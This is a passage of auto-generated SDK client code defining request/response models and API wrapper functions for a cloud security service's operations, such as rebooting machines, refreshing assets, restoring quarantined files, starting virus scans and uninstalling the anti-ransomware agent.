  requestId?: string(name='RequestId', example='EA4AC8B7-0C18-5BC1-9DA4-798B3BE4****'),
  timeCost?: long(name='TimeCost', example='1'),
}

model QueryJenkinsImageRegistryPersistenceDayResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: QueryJenkinsImageRegistryPersistenceDayResponseBody(name='body'),
}

async function queryJenkinsImageRegistryPersistenceDayWithOptions(request: QueryJenkinsImageRegistryPersistenceDayRequest, runtime: Util.RuntimeOptions): QueryJenkinsImageRegistryPersistenceDayResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'QueryJenkinsImageRegistryPersistenceDay',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function queryJenkinsImageRegistryPersistenceDay(request: QueryJenkinsImageRegistryPersistenceDayRequest): QueryJenkinsImageRegistryPersistenceDayResponse {
  var runtime = new Util.RuntimeOptions{};
  return queryJenkinsImageRegistryPersistenceDayWithOptions(request, runtime);
}

model QueryPreCheckDatabaseRequest {
  instanceUuid?: string(name='InstanceUuid', example='ebc895506c6911ed800000163e0e****'),
  taskId?: string(name='TaskId', example='t-000bc9nqwxsbyvod****'),
  uniRegionId?: string(name='UniRegionId', example='cn-hangzhou'),
}

model QueryPreCheckDatabaseResponseBody = {
  completedTime?: long(name='CompletedTime', example='1657524396'),
  createdTime?: long(name='CreatedTime', example='1660448660'),
  description?: string(name='Description', example='completed'),
  progress?: int32(name='Progress', example='100'),
  requestId?: string(name='RequestId', example='CE500770-42D3-442E-9DDD-156E0F9F****'),
  result?: string(name='Result', example='[
    {
        "instanceId": "i-wz91if83t97xgtn2****",
        "checkTime": 1671245753,
        "sourceType": "MSSQL",
        "results":
        [
            {
                "item": "OSS_INTERNAL_ENDPOINT_CONNECTIVITY",
                "result": "PASSED"
            },
            {
                "item": "SERVICE_CONNECTIVITY",
                "result": "PASSED"
            },
            {
                "item": "SQL_SERVER_DB_IN_SIMPLE_RECOVERY_MODE",
                "result": "WARNING"
            },
            {
                "item": "SQL_SERVER_DB_NOT_ONLINE",
                "result": "PASSED"
            }
        ]
    }
]'),
  updatedTime?: long(name='UpdatedTime', example='1671084106'),
}

model QueryPreCheckDatabaseResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: QueryPreCheckDatabaseResponseBody(name='body'),
}

async function queryPreCheckDatabaseWithOptions(request: QueryPreCheckDatabaseRequest, runtime: Util.RuntimeOptions): QueryPreCheckDatabaseResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.instanceUuid)) {
    query['InstanceUuid'] = request.instanceUuid;
  }
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  if (!Util.isUnset(request.uniRegionId)) {
    query['UniRegionId'] = request.uniRegionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'QueryPreCheckDatabase',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function queryPreCheckDatabase(request: QueryPreCheckDatabaseRequest): QueryPreCheckDatabaseResponse {
  var runtime = new Util.RuntimeOptions{};
  return queryPreCheckDatabaseWithOptions(request, runtime);
}

model RebootMachineRequest {
  uuid?: string(name='Uuid', description='The UUID of the server that you want to restart.

>  You can call the [DescribeCloudCenterInstances](~~describecloudcenterinstances~~) operation to query the UUIDs of servers.', example='7151f27e-1d51-4e98-a540-8936a****'),
}

model RebootMachineResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='151F6EB6-D5F3-417A-AF7B-4D84975DB586'),
}

model RebootMachineResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: RebootMachineResponseBody(name='body'),
}

async function rebootMachineWithOptions(request: RebootMachineRequest, runtime: Util.RuntimeOptions): RebootMachineResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'RebootMachine',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function rebootMachine(request: RebootMachineRequest): RebootMachineResponse {
  var runtime = new Util.RuntimeOptions{};
  return rebootMachineWithOptions(request, runtime);
}

model RefreshAssetsRequest {
  assetType?: string(name='AssetType', description='The type of the asset that you want to synchronize.default **ecs**, Valid values:

*   **cloud_product**: Alibaba Cloud service
*   **ecs**: Elastic Compute Service (ECS) instance
*   **container_image**: container image', example='cloud_product'),
  cloudAssetSubType?: int32(name='CloudAssetSubType', description='The subtype of the cloud service.

>  The following list describes the subtypes of cloud services.', example='0'),
  cloudAssetType?: int32(name='CloudAssetType', description='The type of the cloud service. Valid values:

*   **0**: ECS
*   **1**: Server Load Balancer (SLB)
*   **3**: ApsaraDB RDS
*   **4**: ApsaraDB for MongoDB (MongoDB)
*   **5**: ApsaraDB for Redis (Redis)
*   **6**: Container Registry
*   **8**: Container Service for Kubernetes (ACK)
*   **9**: Virtual Private Cloud (VPC)
*   **11**: ActionTrail
*   **12**: Alibaba Cloud CDN (CDN)
*   **13**: Certificate Management Service (formerly SSL Certificates Service)
*   **14**: Apsara Devops
*   **15**: Resource Access Management (RAM)
*   **16**: Anti-DDoS
*   **17**: Web Application Firewall (WAF)
*   **18**: Object Storage Service (OSS)
*   **19**: PolarDB
*   **20**: ApsaraDB RDS for PostgreSQL
*   **21**: Microservices Engine (MSE)
*   **22**: Apsara File Storage NAS (NAS)
*   **23**: Data Security Center (DSC)
*   **24**: Elastic IP Address (EIP)', example='0'),
}

model RefreshAssetsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='340D7FC4-D575-1661-8ACD-CFA7BE57B795'),
}

model RefreshAssetsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: RefreshAssetsResponseBody(name='body'),
}

async function refreshAssetsWithOptions(request: RefreshAssetsRequest, runtime: Util.RuntimeOptions): RefreshAssetsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.assetType)) {
    query['AssetType'] = request.assetType;
  }
  if (!Util.isUnset(request.cloudAssetSubType)) {
    query['CloudAssetSubType'] = request.cloudAssetSubType;
  }
  if (!Util.isUnset(request.cloudAssetType)) {
    query['CloudAssetType'] = request.cloudAssetType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'RefreshAssets',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function refreshAssets(request: RefreshAssetsRequest): RefreshAssetsResponse {
  var runtime = new Util.RuntimeOptions{};
  return refreshAssetsWithOptions(request, runtime);
}

model RefreshContainerAssetsRequest {
  assetType?: string(name='AssetType', description='The type of the container asset whose statistics you want to refresh. Valid values:

*   **IMAGE**
*   **CONTAINER**', example='IMAGE'),
}

model RefreshContainerAssetsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='2090F329-3658-49AF-820B-C4157FC31BCB'),
}

model RefreshContainerAssetsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: RefreshContainerAssetsResponseBody(name='body'),
}

async function refreshContainerAssetsWithOptions(request: RefreshContainerAssetsRequest, runtime: Util.RuntimeOptions): RefreshContainerAssetsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.assetType)) {
    query['AssetType'] = request.assetType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'RefreshContainerAssets',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function refreshContainerAssets(request: RefreshContainerAssetsRequest): RefreshContainerAssetsResponse {
  var runtime = new Util.RuntimeOptions{};
  return refreshContainerAssetsWithOptions(request, runtime);
}

model RemoveCheckInstanceResultWhiteListRequest {
  checkId?: long(name='CheckId', example='11'),
  instanceIds?: [ string ](name='InstanceIds'),
}

model RemoveCheckInstanceResultWhiteListResponseBody = {
  requestId?: string(name='RequestId', example='F156EA41-8EEF-54B2-908B-EAE071XXXXXX'),
}

model RemoveCheckInstanceResultWhiteListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: RemoveCheckInstanceResultWhiteListResponseBody(name='body'),
}

async function removeCheckInstanceResultWhiteListWithOptions(request: RemoveCheckInstanceResultWhiteListRequest, runtime: Util.RuntimeOptions): RemoveCheckInstanceResultWhiteListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'RemoveCheckInstanceResultWhiteList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function removeCheckInstanceResultWhiteList(request: RemoveCheckInstanceResultWhiteListRequest): RemoveCheckInstanceResultWhiteListResponse {
  var runtime = new Util.RuntimeOptions{};
  return removeCheckInstanceResultWhiteListWithOptions(request, runtime);
}

model RemoveCheckResultWhiteListRequest {
  checkGroupId?: string(name='CheckGroupId', example='Deprecated'),
  checkIds?: [ long ](name='CheckIds'),
  type?: string(name='Type', example='Deprecated'),
}

model RemoveCheckResultWhiteListResponseBody = {
  code?: string(name='Code', example='200'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='98C82076-E0D5-51DA-99F2-513F4XXXXXX'),
  success?: boolean(name='Success', example='true'),
}

model RemoveCheckResultWhiteListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: RemoveCheckResultWhiteListResponseBody(name='body'),
}

async function removeCheckResultWhiteListWithOptions(request: RemoveCheckResultWhiteListRequest, runtime: Util.RuntimeOptions): RemoveCheckResultWhiteListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkGroupId)) {
    query['CheckGroupId'] = request.checkGroupId;
  }
  if (!Util.isUnset(request.checkIds)) {
    query['CheckIds'] = request.checkIds;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'RemoveCheckResultWhiteList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function removeCheckResultWhiteList(request: RemoveCheckResultWhiteListRequest): RemoveCheckResultWhiteListResponse {
  var runtime = new Util.RuntimeOptions{};
  return removeCheckResultWhiteListWithOptions(request, runtime);
}

model RollbackSuspEventQuaraFileRequest {
  from?: string(name='From', description='The ID of the request source. Set the value to sas.', example='sas'),
  quaraFileId?: int32(name='QuaraFileId', description='The ID of the quarantined file.   
> If you do not configure this parameter, you cannot call the RollbackSuspEventQuaraFile operation to restore a quarantined file. You can call the [DescribeSuspEventQuaraFiles](~~DescribeSuspEventQuaraFiles~~) operation to query the IDs of quarantined files.', example='3921797'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.3.4'),
}

model RollbackSuspEventQuaraFileResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='52A3AEE6-114A-499D-8990-4BA9B27FE0AA'),
}

model RollbackSuspEventQuaraFileResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: RollbackSuspEventQuaraFileResponseBody(name='body'),
}

async function rollbackSuspEventQuaraFileWithOptions(request: RollbackSuspEventQuaraFileRequest, runtime: Util.RuntimeOptions): RollbackSuspEventQuaraFileResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.quaraFileId)) {
    query['QuaraFileId'] = request.quaraFileId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'RollbackSuspEventQuaraFile',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function rollbackSuspEventQuaraFile(request: RollbackSuspEventQuaraFileRequest): RollbackSuspEventQuaraFileResponse {
  var runtime = new Util.RuntimeOptions{};
  return rollbackSuspEventQuaraFileWithOptions(request, runtime);
}

model SasInstallCodeRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='120.41.XX.XX'),
}

model SasInstallCodeResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='B256A525-7E42-4BB9-A27C-9017FDDFF1A2'),
  data?: string(name='data', description='The installation verification code that is used to run the installation command when you manually install the Security Center agent.', example='eDkhGP'),
}

model SasInstallCodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: SasInstallCodeResponseBody(name='body'),
}

async function sasInstallCodeWithOptions(request: SasInstallCodeRequest, runtime: Util.RuntimeOptions): SasInstallCodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'SasInstallCode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function sasInstallCode(request: SasInstallCodeRequest): SasInstallCodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return sasInstallCodeWithOptions(request, runtime);
}

model SaveImageBaselineStrategyRequest {
  baselineItemList?: string(name='BaselineItemList', example='ak_leak'),
  lang?: string(name='Lang', example='zh'),
  strategyId?: long(name='StrategyId', example='8639'),
  strategyName?: string(name='StrategyName', example='default'),
}

model SaveImageBaselineStrategyResponseBody = {
  requestId?: string(name='RequestId', example='9AB5D3DE-6E0F-5633-AA71-4B90C724****'),
}

model SaveImageBaselineStrategyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: SaveImageBaselineStrategyResponseBody(name='body'),
}

async function saveImageBaselineStrategyWithOptions(request: SaveImageBaselineStrategyRequest, runtime: Util.RuntimeOptions): SaveImageBaselineStrategyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.baselineItemList)) {
    query['BaselineItemList'] = request.baselineItemList;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  if (!Util.isUnset(request.strategyName)) {
    query['StrategyName'] = request.strategyName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'SaveImageBaselineStrategy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function saveImageBaselineStrategy(request: SaveImageBaselineStrategyRequest): SaveImageBaselineStrategyResponse {
  var runtime = new Util.RuntimeOptions{};
  return saveImageBaselineStrategyWithOptions(request, runtime);
}

model SaveSuspEventUserSettingRequest {
  from?: string(name='From', example='sas'),
  levelsOn?: string(name='LevelsOn', example='suspicious,serious,remind'),
}

model SaveSuspEventUserSettingResponseBody = {
  code?: string(name='Code', example='200'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='AE6229A0-BDBE-534C-A3F8-095EBXXXXXX'),
  success?: boolean(name='Success', example='true'),
}

model SaveSuspEventUserSettingResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: SaveSuspEventUserSettingResponseBody(name='body'),
}

async function saveSuspEventUserSettingWithOptions(request: SaveSuspEventUserSettingRequest, runtime: Util.RuntimeOptions): SaveSuspEventUserSettingResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.levelsOn)) {
    query['LevelsOn'] = request.levelsOn;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'SaveSuspEventUserSetting',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function saveSuspEventUserSetting(request: SaveSuspEventUserSettingRequest): SaveSuspEventUserSettingResponse {
  var runtime = new Util.RuntimeOptions{};
  return saveSuspEventUserSettingWithOptions(request, runtime);
}

model SetRegistryScanDayNumRequest {
  scanDayNum?: int32(name='ScanDayNum', example='1'),
}

model SetRegistryScanDayNumResponseBody = {
  requestId?: string(name='RequestId', example='48483161-F328-5A12-AB78-3EB81F37****'),
}

model SetRegistryScanDayNumResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: SetRegistryScanDayNumResponseBody(name='body'),
}

async function setRegistryScanDayNumWithOptions(request: SetRegistryScanDayNumRequest, runtime: Util.RuntimeOptions): SetRegistryScanDayNumResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.scanDayNum)) {
    query['ScanDayNum'] = request.scanDayNum;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'SetRegistryScanDayNum',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function setRegistryScanDayNum(request: SetRegistryScanDayNumRequest): SetRegistryScanDayNumResponse {
  var runtime = new Util.RuntimeOptions{};
  return setRegistryScanDayNumWithOptions(request, runtime);
}

model StartBaselineSecurityCheckRequest {
  itemIds?: [ long ](name='ItemIds', description='The IDs of the check items.

>  To perform a check task on cloud service configurations, you must specify the IDs of the check items. You can call the  [DescribeRiskItemType ](~~DescribeRiskItemType~~)  operation to query the IDs of check items.'),
  lang?: string(name='Lang', description='The language of the content within the request and the response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='106.11.XX.XX'),
  type?: string(name='Type', description='The type of the check task. Valid values:

*   **check**
*   **verify**', example='verify'),
}

model StartBaselineSecurityCheckResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='48D2E9A9-A1B0-4295-B727-0995757C47E9'),
}

model StartBaselineSecurityCheckResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: StartBaselineSecurityCheckResponseBody(name='body'),
}

/**
  * @deprecated
  *
  * @param request StartBaselineSecurityCheckRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return StartBaselineSecurityCheckResponse
 */
// Deprecated
async function startBaselineSecurityCheckWithOptions(request: StartBaselineSecurityCheckRequest, runtime: Util.RuntimeOptions): StartBaselineSecurityCheckResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.itemIds)) {
    query['ItemIds'] = request.itemIds;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'StartBaselineSecurityCheck',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * @deprecated
  *
  * @param request StartBaselineSecurityCheckRequest
  * @return StartBaselineSecurityCheckResponse
 */
// Deprecated
async function startBaselineSecurityCheck(request: StartBaselineSecurityCheckRequest): StartBaselineSecurityCheckResponse {
  var runtime = new Util.RuntimeOptions{};
  return startBaselineSecurityCheckWithOptions(request, runtime);
}

model StartDiscoverDatabaseTaskResponseBody = {
  createMark?: string(name='CreateMark'),
  requestId?: string(name='RequestId'),
}

model StartDiscoverDatabaseTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: StartDiscoverDatabaseTaskResponseBody(name='body'),
}

async function startDiscoverDatabaseTaskWithOptions(runtime: Util.RuntimeOptions): StartDiscoverDatabaseTaskResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'StartDiscoverDatabaseTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function startDiscoverDatabaseTask(): StartDiscoverDatabaseTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return startDiscoverDatabaseTaskWithOptions(runtime);
}

model StartPreCheckDatabaseRequest {
  databaseType?: string(name='DatabaseType', example='MYSQL'),
  instanceUuid?: string(name='InstanceUuid', example='ec1c0ba21d2911ed800000163e0e****'),
  uniRegionId?: string(name='UniRegionId', example='cn-hongkong'),
}

model StartPreCheckDatabaseResponseBody = {
  createMark?: string(name='CreateMark', example='t-0006d4pydyir6l1k****'),
  requestId?: string(name='RequestId', example='F6DC2DFF-AB3A-563A-8FC2-3D0D991E****'),
}

model StartPreCheckDatabaseResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: StartPreCheckDatabaseResponseBody(name='body'),
}

async function startPreCheckDatabaseWithOptions(request: StartPreCheckDatabaseRequest, runtime: Util.RuntimeOptions): StartPreCheckDatabaseResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.databaseType)) {
    query['DatabaseType'] = request.databaseType;
  }
  if (!Util.isUnset(request.instanceUuid)) {
    query['InstanceUuid'] = request.instanceUuid;
  }
  if (!Util.isUnset(request.uniRegionId)) {
    query['UniRegionId'] = request.uniRegionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'StartPreCheckDatabase',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function startPreCheckDatabase(request: StartPreCheckDatabaseRequest): StartPreCheckDatabaseResponse {
  var runtime = new Util.RuntimeOptions{};
  return startPreCheckDatabaseWithOptions(request, runtime);
}

model StartVirusScanTaskRequest {
  targetInfo?: string(name='TargetInfo'),
}

model StartVirusScanTaskResponseBody = {
  requestId?: string(name='RequestId'),
  scanTaskId?: long(name='ScanTaskId'),
}

model StartVirusScanTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: StartVirusScanTaskResponseBody(name='body'),
}

async function startVirusScanTaskWithOptions(request: StartVirusScanTaskRequest, runtime: Util.RuntimeOptions): StartVirusScanTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.targetInfo)) {
    query['TargetInfo'] = request.targetInfo;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'StartVirusScanTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function startVirusScanTask(request: StartVirusScanTaskRequest): StartVirusScanTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return startVirusScanTaskWithOptions(request, runtime);
}

model SubmitCheckResponseBody = {
  data?: {
    operateCode?: string(name='OperateCode'),
  }(name='Data'),
  requestId?: string(name='RequestId'),
  taskId?: string(name='TaskId'),
}

model SubmitCheckResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: SubmitCheckResponseBody(name='body'),
}

async function submitCheckWithOptions(runtime: Util.RuntimeOptions): SubmitCheckResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'SubmitCheck',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function submitCheck(): SubmitCheckResponse {
  var runtime = new Util.RuntimeOptions{};
  return submitCheckWithOptions(runtime);
}

model UnbindAegisRequest {
  uuids?: string(name='Uuids'),
}

model UnbindAegisResponseBody = {
  requestId?: string(name='RequestId'),
}

model UnbindAegisResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UnbindAegisResponseBody(name='body'),
}

async function unbindAegisWithOptions(request: UnbindAegisRequest, runtime: Util.RuntimeOptions): UnbindAegisResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UnbindAegis',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function unbindAegis(request: UnbindAegisRequest): UnbindAegisResponse {
  var runtime = new Util.RuntimeOptions{};
  return unbindAegisWithOptions(request, runtime);
}

model UninstallBackupClientRequest {
  policyVersion?: string(name='PolicyVersion', description='The version of the anti-ransomware policy. You can call the [DescribeBackupPolicies](~~DescribeBackupPolicies~~) operation to query the versions of anti-ransomware policies. Valid values:

*   **1.0.0**
*   **2.0.0**', example='2.0.0'),
  uuid?: string(name='Uuid', description='The UUID of the server from which you want to uninstall the anti-ransomware agent.

>  You must specify at least one of the UuidList and Uuid parameters.', example='D0D6E6E4-CB8C-4897-B852-46AEFDA0****'),
  uuidList?: [ string ](name='UuidList', description='The UUIDs of the servers from which you want to uninstall the anti-ransomware agent.

>  You must specify at least one of the UuidList and Uuid parameters.', example='["D0D6E6E4-CB8C-4897-B852-46AEFDA0****", "3bb30859-b3b5-4f28-868f-b0892c98****"]'),
}

model UninstallBackupClientResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='8eec3b63-18af-454b-8c17-aabcf7190b70'),
}

model UninstallBackupClientResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UninstallBackupClientResponseBody(name='body'),
}

async function uninstallBackupClientWithOptions(request: UninstallBackupClientRequest, runtime: Util.RuntimeOptions): UninstallBackupClientResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.policyVersion)) {
    query['PolicyVersion'] = request.policyVersion;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UninstallBackupClient',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function uninstallBackupClient(request: UninstallBackupClientRequest): UninstallBackupClientResponse {
  var runtime = new Util.RuntimeOptions{};
  return uninstallBackupClientWithOptions(request, runtime);
}

